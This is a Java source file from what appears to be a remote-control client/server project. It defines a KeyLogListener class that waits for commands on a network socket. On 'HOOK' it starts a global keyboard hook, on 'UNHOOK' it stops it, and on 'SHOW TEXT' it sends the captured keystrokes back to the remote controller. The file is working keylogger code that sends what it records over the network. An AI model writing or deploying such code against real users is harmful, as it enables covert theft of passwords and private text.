package controller;


import com.github.kwhat.jnativehook.GlobalScreen;
import com.github.kwhat.jnativehook.NativeHookException;
import com.github.kwhat.jnativehook.dispatcher.SwingDispatchService;
import com.github.kwhat.jnativehook.keyboard.NativeKeyEvent;
import com.github.kwhat.jnativehook.keyboard.NativeKeyListener;
import com.github.kwhat.jnativehook.GlobalScreen;
import model.KeyLog;
import Program.Server;

import java.io.IOException;
import java.util.ArrayList;

import javax.swing.JOptionPane;
public class KeyLogListener {
	
	public KeyLog keyLog = new KeyLog();
	
	public KeyLogListener() throws NativeHookException {
		
		//GlobalScreen.setEventDispatcher(new SwingDispatchService());
		
		try {
			
			
			String keyRequestLine;
			String keyLogResult = null;
			
			int count = 0;
			
			while (true) {
				keyRequestLine = Server.in.readLine();
				if (keyRequestLine.equals("HOOK"))
				{
					//JOptionPane.showMessageDialog(null, "Already hook!");
					System.out.println("Bat dau KeyLog");
					KeyLog.KeyLogger(keyLog);
					
				}
				else if (keyRequestLine.equals("UNHOOK"))
				{
					JOptionPane.showMessageDialog(null, "Already unhook" + "!");
					
					System.out.println("Ket thuc Keylog:" + keyLogResult);
					KeyLog.UnKeyLogger(keyLog);	
					keyLogResult = keyLog.keylog;
					
				}
				else if (keyRequestLine.equals("SHOW TEXT"))
				{
					
					Server.out.write(keyLogResult);
					Server.out.newLine();
					Server.out.flush();
					
					//JOptionPane.showMessageDialog(null, "Already send!" );
					keyLog.keylog = "";					
				}
				
				else if (keyRequestLine.equals("EXIT_KEYSTROKE"))
				{
					return;
				}
				
			}
		} catch (IOException e) {

			e.printStackTrace();
			
		}
		
		
	}
}